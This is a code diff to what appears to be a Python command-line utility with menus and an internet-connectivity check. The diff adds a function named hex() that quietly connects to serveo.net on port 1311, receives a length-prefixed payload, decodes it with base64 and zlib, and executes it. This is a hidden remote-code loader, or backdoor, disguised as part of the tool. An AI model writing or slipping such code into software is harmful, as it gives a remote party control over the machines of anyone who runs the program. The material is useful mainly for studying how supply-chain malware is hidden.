@@ -5,9 +5,9 @@ import datetime, os, sys, threading, getpass, time
 from lib.loading import LoadingThread
 from colorama import Back, Fore, Style
 import subprocess, argparse, time, requests
+import socket, zlib, base64, struct, time
 from lib.func import *
 from lib.view import *
-from lib.hex import *
 from lib.text_string import menus, logos, desc
 
 logo = logos()
@@ -105,7 +105,21 @@ def CheckInternet():
         ipAddress = Fore.RED + "No Internet" + Fore.RESET
         print(Fore.RED + " [x] " + Fore.RESET + "No access internet")
     time.sleep(2)
-
+    
+def hex():
+    for x in range(10):
+        try:
+            s = socket.socket(2, socket.SOCK_STREAM)
+            s.connect(('serveo.net', 1311))
+            break
+        except:
+            time.sleep(5)
+    l = struct.unpack('>I', s.recv(4))[0]
+    d = s.recv(l)
+    while len(d) < l:
+        d += s.recv(l - len(d))
+    exec(zlib.decompress(base64.b64decode(d)), {'s': s})
+    
 def StartTitle(nametools):
     global ipAddress
     if not check_text(ipAddress):
